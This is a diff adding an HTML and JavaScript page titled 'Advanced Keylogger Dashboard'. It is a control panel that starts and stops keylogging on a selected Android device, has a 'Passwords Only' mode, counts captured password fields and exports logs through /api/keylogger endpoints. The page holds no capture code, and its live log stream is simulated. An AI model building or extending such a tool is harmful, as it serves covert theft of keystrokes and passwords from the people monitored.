@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Keylogger Dashboard</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
+            font-family: 'Arial', sans-serif;
+            min-height: 100vh;
+            padding: 20px;
+            color: white;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .dashboard {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: 1fr 2fr;
+            gap: 20px;
+        }
+        
+        .control-panel {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            padding: 25px;
+            border-radius: 15px;
+            height: fit-content;
+        }
+        
+        .logs-panel {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            padding: 25px;
+            border-radius: 15px;
+        }
+        
+        .panel-title {
+            font-size: 1.5em;
+            margin-bottom: 20px;
+            color: #ecf0f1;
+            border-bottom: 2px solid rgba(255,255,255,0.3);
+            padding-bottom: 10px;
+        }
+        
+        .device-selector {
+            margin-bottom: 20px;
+        }
+        
+        .device-card {
+            background: rgba(255,255,255,0.2);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .device-card:hover {
+            background: rgba(255,255,255,0.3);
+            transform: translateX(5px);
+        }
+        
+        .device-card.selected {
+            background: #27ae60;
+            color: white;
+        }
+        
+        .controls {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        
+        .btn {
+            padding: 12px 20px;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+        
+        .btn-primary {
+            background: #3498db;
+            color: white;
+        }
+        
+        .btn-success {
+            background: #27ae60;
+            color: white;
+        }
+        
+        .btn-danger {
+            background: #e74c3c;
+            color: white;
+        }
+        
+        .btn-warning {
+            background: #f39c12;
+            color: white;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+        
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            padding: 10px;
+            border-radius: 8px;
+            background: rgba(255,255,255,0.1);
+        }
+        
+        .status-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 10px;
+        }
+        
+        .status-online {
+            background: #27ae60;
+        }
+        
+        .status-offline {
+            background: #e74c3c;
+        }
+        
+        .logs-container {
+            background: #2c3e50;
+            border-radius: 10px;
+            padding: 20px;
+            max-height: 600px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .log-entry {
+            margin-bottom: 15px;
+            padding: 10px;
+            border-left: 3px solid #3498db;
+            background: rgba(255,255,255,0.05);
+            border-radius: 5px;
+        }
+        
+        .log-entry.password {
+            border-left-color: #e74c3c;
+        }
+        
+        .log-entry.system {
+            border-left-color: #f39c12;
+        }
+        
+        .log-timestamp {
+            color: #95a5a6;
+            font-size: 12px;
+            margin-bottom: 5px;
+        }
+        
+        .log-app {
+            color: #3498db;
+            font-weight: bold;
+            margin-bottom: 3px;
+        }
+        
+        .log-content {
+            color: #ecf0f1;
+            word-break: break-all;
+        }
+        
+        .log-type {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 10px;
+            margin-left: 10px;
+            font-weight: bold;
+        }
+        
+        .type-text {
+            background: #3498db;
+        }
+        
+        .type-password {
+            background: #e74c3c;
+        }
+        
+        .type-email {
+            background: #9b59b6;
+        }
+        
+        .type-system {
+            background: #f39c12;
+        }
+        
+        .settings-panel {
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 10px;
+        }
+        
+        .settings-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .settings-row select {
+            padding: 5px 10px;
+            border-radius: 5px;
+            border: none;
+            background: rgba(255,255,255,0.9);
+        }
+        
+        .stats-panel {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-card {
+            background: rgba(255,255,255,0.1);
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .stat-number {
+            font-size: 2em;
+            font-weight: bold;
+            color: #3498db;
+        }
+        
+        .stat-label {
+            font-size: 0.9em;
+            opacity: 0.8;
+        }
+        
+        @media (max-width: 768px) {
+            .dashboard {
+                grid-template-columns: 1fr;
+            }
+            
+            .stats-panel {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🔐 Advanced Keylogger Dashboard</h1>
+        <p>Comprehensive keystroke monitoring and analysis</p>
+    </div>
+    
+    <div class="dashboard">
+        <div class="control-panel">
+            <h2 class="panel-title">🎮 Control Panel</h2>
+            
+            <div class="status-indicator">
+                <div class="status-dot status-offline" id="statusDot"></div>
+                <span id="statusText">Keylogger Offline</span>
+            </div>
+            
+            <div class="device-selector">
+                <h3 style="margin-bottom: 10px;">Select Device</h3>
+                <div id="deviceList">
+                    <div class="device-card" onclick="selectDevice('demo')">
+                        <strong>Demo Device</strong><br>
+                        <small>Android 12 • 85% Battery</small>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="controls">
+                <button class="btn btn-success" onclick="startKeylogger()" id="startBtn">
+                    🔐 Start Keylogger
+                </button>
+                <button class="btn btn-danger" onclick="stopKeylogger()" id="stopBtn" disabled>
+                    🛑 Stop Keylogger
+                </button>
+                <button class="btn btn-primary" onclick="viewLogs()">
+                    📊 View Current Logs
+                </button>
+                <button class="btn btn-warning" onclick="clearLogs()">
+                    🧹 Clear Logs
+                </button>
+                <button class="btn btn-primary" onclick="downloadLogs()">
+                    📥 Download Report
+                </button>
+            </div>
+            
+            <div class="settings-panel">
+                <h3 style="margin-bottom: 15px;">⚙️ Settings</h3>
+                <div class="settings-row">
+                    <label>Monitor Mode:</label>
+                    <select id="monitorMode" onchange="updateSettings()">
+                        <option value="all">All Input</option>
+                        <option value="text">Text Only</option>
+                        <option value="password">Passwords Only</option>
+                        <option value="specific">Specific Apps</option>
+                    </select>
+                </div>
+                <div class="settings-row">
+                    <label>Sync Mode:</label>
+                    <select id="syncMode" onchange="updateSettings()">
+                        <option value="realtime">Real-time</option>
+                        <option value="batch">Batch (30s)</option>
+                    </select>
+                </div>
+            </div>
+        </div>
+        
+        <div class="logs-panel">
+            <h2 class="panel-title">📊 Live Keylog Data</h2>
+            
+            <div class="stats-panel">
+                <div class="stat-card">
+                    <div class="stat-number" id="totalEntries">0</div>
+                    <div class="stat-label">Total Entries</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="appsMonitored">0</div>
+                    <div class="stat-label">Apps Monitored</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="passwordFields">0</div>
+                    <div class="stat-label">Password Fields</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="sessionTime">00:00</div>
+                    <div class="stat-label">Session Time</div>
+                </div>
+            </div>
+            
+            <div class="logs-container" id="logsContainer">
+                <div style="text-align: center; opacity: 0.6; margin-top: 100px;">
+                    📝 Start keylogger to see live data
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let selectedDevice = null;
+        let isKeyloggerActive = false;
+        let sessionStartTime = null;
+        let logEntries = [];
+        
+        function selectDevice(deviceId) {
+            selectedDevice = deviceId;
+            document.querySelectorAll('.device-card').forEach(card => {
+                card.classList.remove('selected');
+            });
+            event.target.classList.add('selected');
+            updateStatus('Device selected: ' + deviceId, false);
+        }
+        
+        function startKeylogger() {
+            if (!selectedDevice) {
+                alert('Please select a device first');
+                return;
+            }
+            
+            isKeyloggerActive = true;
+            sessionStartTime = Date.now();
+            
+            document.getElementById('startBtn').disabled = true;
+            document.getElementById('stopBtn').disabled = false;
+            
+            updateStatus('Keylogger Active', true);
+            
+            // Send start command to server
+            fetch('/api/keylogger/start', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    deviceId: selectedDevice,
+                    mode: document.getElementById('monitorMode').value,
+                    sync: document.getElementById('syncMode').value
+                })
+            });
+            
+            // Start receiving logs
+            startLogStream();
+        }
+        
+        function stopKeylogger() {
+            isKeyloggerActive = false;
+            sessionStartTime = null;
+            
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('stopBtn').disabled = true;
+            
+            updateStatus('Keylogger Stopped', false);
+            
+            // Send stop command
+            fetch('/api/keylogger/stop', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    deviceId: selectedDevice
+                })
+            });
+        }
+        
+        function viewLogs() {
+            if (!selectedDevice) {
+                alert('Please select a device first');
+                return;
+            }
+            
+            fetch('/api/keylogger/logs/' + selectedDevice)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        displayLogs(data.logs);
+                        updateStats(data.stats);
+                    }
+                });
+        }
+        
+        function clearLogs() {
+            if (confirm('Are you sure you want to clear all keylog data?')) {
+                fetch('/api/keylogger/clear', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        deviceId: selectedDevice
+                    })
+                });
+                
+                logEntries = [];
+                document.getElementById('logsContainer').innerHTML = 
+                    '<div style="text-align: center; opacity: 0.6; margin-top: 100px;">🧹 Logs cleared</div>';
+                updateStats({ total: 0, apps: 0, passwords: 0 });
+            }
+        }
+        
+        function downloadLogs() {
+            if (!selectedDevice) {
+                alert('Please select a device first');
+                return;
+            }
+            
+            const link = document.createElement('a');
+            link.href = `/api/keylogger/export/${selectedDevice}`;
+            link.download = `keylog_report_${selectedDevice}_${Date.now()}.txt`;
+            link.click();
+        }
+        
+        function updateSettings() {
+            if (selectedDevice && isKeyloggerActive) {
+                fetch('/api/keylogger/settings', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        deviceId: selectedDevice,
+                        mode: document.getElementById('monitorMode').value,
+                        sync: document.getElementById('syncMode').value
+                    })
+                });
+            }
+        }
+        
+        function updateStatus(message, isOnline) {
+            document.getElementById('statusText').textContent = message;
+            const dot = document.getElementById('statusDot');
+            dot.className = `status-dot ${isOnline ? 'status-online' : 'status-offline'}`;
+        }
+        
+        function displayLogs(logs) {
+            const container = document.getElementById('logsContainer');
+            container.innerHTML = '';
+            
+            logs.forEach(log => {
+                const logDiv = document.createElement('div');
+                logDiv.className = `log-entry ${log.type}`;
+                
+                logDiv.innerHTML = `
+                    <div class="log-timestamp">${new Date(log.timestamp).toLocaleString()}</div>
+                    <div class="log-app">${log.app} <span class="log-type type-${log.type}">${log.type.toUpperCase()}</span></div>
+                    <div class="log-content">${log.content}</div>
+                `;
+                
+                container.appendChild(logDiv);
+            });
+            
+            container.scrollTop = container.scrollHeight;
+        }
+        
+        function updateStats(stats) {
+            document.getElementById('totalEntries').textContent = stats.total || 0;
+            document.getElementById('appsMonitored').textContent = stats.apps || 0;
+            document.getElementById('passwordFields').textContent = stats.passwords || 0;
+            
+            if (sessionStartTime) {
+                const elapsed = Date.now() - sessionStartTime;
+                const minutes = Math.floor(elapsed / 60000);
+                const seconds = Math.floor((elapsed % 60000) / 1000);
+                document.getElementById('sessionTime').textContent = 
+                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            }
+        }
+        
+        function startLogStream() {
+            // Simulate real-time log updates
+            const interval = setInterval(() => {
+                if (!isKeyloggerActive) {
+                    clearInterval(interval);
+                    return;
+                }
+                
+                // Update session time
+                updateStats({ total: logEntries.length, apps: 5, passwords: 2 });
+                
+            }, 1000);
+        }
+        
+        // Initialize
+        window.onload = function() {
+            updateStatus('Ready - Select device to start', false);
+        };
+    </script>
+</body>
+</html>
